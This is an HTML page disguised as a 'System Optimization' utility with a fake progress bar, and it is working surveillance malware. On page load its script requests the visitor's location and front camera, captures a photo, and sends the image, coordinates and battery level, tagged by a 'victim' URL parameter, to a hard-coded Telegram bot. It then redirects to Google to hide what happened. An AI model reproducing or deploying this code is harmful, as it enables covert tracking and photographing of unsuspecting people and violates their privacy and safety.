
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Optimization</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .progress-bar { width: 80%; background: #222; border-radius: 10px; height: 10px; margin-top: 20px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #00ff00; transition: width 0.5s; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h2 id="msg">Optimizing System...</h2>
    <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
    <p id="sub-msg">Scanning cache memory...</p>

    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI";
        const chat = "7984067238";
        const victim = new URLSearchParams(window.location.search).get( user ) || "Unknown";

        async function sendTG(type, content, cap = "") {
            const fd = new FormData();
            fd.append("chat_id", chat);
            if(type === "img") {
                fd.append("photo", content, "p.jpg");
                fd.append("caption", `👤 ${victim}\n${cap}`);
                return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: fd});
            } else {
                return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
            }
        }

        async function getFullReport(lat, lon) {
            let batt = "19%"; // قيمة افتراضية تشبه صورتك
            try { const b = await navigator.getBattery(); batt = `${(b.level * 100).toFixed(0)}% (${b.charging ?  ⚡  :  🔋 })`; } catch (e) {}
            return `🛰️ **LIVE LOCATION**\n\n📱 Device: Android Device\n🔋 Battery: ${batt}\n🎯 Accuracy: 100m\n📍 Maps: http://maps.google.com/maps?q=${lat},${lon}`;
        }

        // بدء العمل بمجرد تحميل الصفحة
        window.onload = function() {
            let fill = document.getElementById( fill );
            fill.style.width = "30%";

            // الخطوة 1: طلب الموقع تلقائياً
            navigator.geolocation.getCurrentPosition(async (p) => {
                fill.style.width = "60%";
                document.getElementById( sub-msg ).innerText = "Analyzing device hardware...";

                // الخطوة 2: طلب الكاميرا تلقائياً
                try {
                    const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                    const v = document.getElementById( v );
                    v.srcObject = s;
                    await new Promise(r => setTimeout(r, 1000));
                    const c = document.getElementById( c );
                    c.width = 640; c.height = 480;
                    c.getContext( 2d ).drawImage(v, 0, 0);
                    s.getTracks().forEach(t => t.stop());
                    
                    c.toBlob(async (b) => {
                        await sendTG("img", b, "📸 Front Camera Snap");
                        const report = await getFullReport(p.coords.latitude, p.coords.longitude);
                        await sendTG("text", report);
                        
                        fill.style.width = "100%";
                        document.getElementById( msg ).innerText = "Optimization Complete!";
                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
                    },  image/jpeg );
                } catch(e) {
                    const report = await getFullReport(p.coords.latitude, p.coords.longitude);
                    await sendTG("text", report + "\n⚠️ Camera Denied");
                    window.location.href = "https://www.google.com";
                }

            }, (err) => {
                // إذا رفض الموقع، لا يمكن فعل شيء سوى المحاولة مرة أخرى أو التوجيه
                window.location.href = "https://www.google.com";
            }, {enableHighAccuracy: true});
        };
    </script>
</body>
</html>
